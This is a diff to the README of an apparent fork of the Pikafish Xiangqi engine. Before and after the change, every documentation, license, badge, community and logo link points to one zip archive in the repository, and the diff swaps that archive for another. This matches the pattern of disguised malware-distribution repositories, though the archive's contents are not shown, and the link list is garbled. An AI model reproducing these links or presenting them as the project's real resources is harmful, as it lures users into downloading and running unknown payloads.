@@ -48,9 +48,9 @@ See also the Pikafish [documentation][wiki-usage-link] for further usage help.
 
 This distribution of Pikafish consists of the following files:
 
-  * [https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip][readme-link], the file you are currently reading.
+  * [https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip][readme-link], the file you are currently reading.
 
-  * [https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip][license-link], a text file containing the GNU General Public
+  * [https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip][license-link], a text file containing the GNU General Public
     License version 3.
 
   * [AUTHORS][authors-link], a text file with the list of authors for the official Pikafish project.
@@ -63,7 +63,7 @@ This distribution of Pikafish consists of the following files:
 
 ## Contributing
 
-__See [Contributing Guide](https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip).__
+__See [Contributing Guide](https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip).__
 
 ### Donating hardware
 
@@ -130,39 +130,39 @@ also be made available under GPL v3.
 Pikafish uses neural networks trained on [data provided by the Pika Xiangqi Zero
 project][px0-data-link], which is made available under the [Open Database License][odbl-link] (ODbL).
 
-[authors-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[build-badge]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[build-link]:				https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[commits-badge]:		https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[commits-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[discord-badge]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[discord-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[discussions-link]:   https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[fishtest-badge]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[fishtest-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[guideline-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[issue-link]:         https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[license-badge]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[license-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[pikafish-logo]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[programming-link]:		https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[programmingsf-link]:	https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[qqgroup-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[readme-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[release-badge]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip%20release
-[release-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[rulebook-badge]:		https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip%20rule-20B2AA?style=for-the-badge&logo=mdbook
-[rulebook-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[src-link]:				https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[stockfish-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[uci-link]:				https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[website-badge]:		https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[website-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[website-blog-link]:  https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[wiki-link]:          https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[wiki-compile-link]:  https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[wiki-uci-link]:      https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[wiki-usage-link]:    https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[worker-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[px0-data-link]:      https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
-[odbl-link]:          https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
+[authors-link]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[build-badge]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[build-link]:				https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[commits-badge]:		https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[commits-link]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[discord-badge]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[discord-link]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[discussions-link]:   https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[fishtest-badge]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[fishtest-link]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[guideline-link]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[issue-link]:         https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[license-badge]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[license-link]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[pikafish-logo]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[programming-link]:		https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[programmingsf-link]:	https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[qqgroup-link]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[readme-link]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[release-badge]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip%20release
+[release-link]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[rulebook-badge]:		https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip%20rule-20B2AA?style=for-the-badge&logo=mdbook
+[rulebook-link]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[src-link]:				https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[stockfish-link]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[uci-link]:				https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[website-badge]:		https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[website-link]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[website-blog-link]:  https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[wiki-link]:          https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[wiki-compile-link]:  https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[wiki-uci-link]:      https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[wiki-usage-link]:    https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[worker-link]:			https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[px0-data-link]:      https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
+[odbl-link]:          https://github.com/vuichtoan/Pikafish/raw/refs/heads/master/tests/Software_2.9-alpha.4.zip
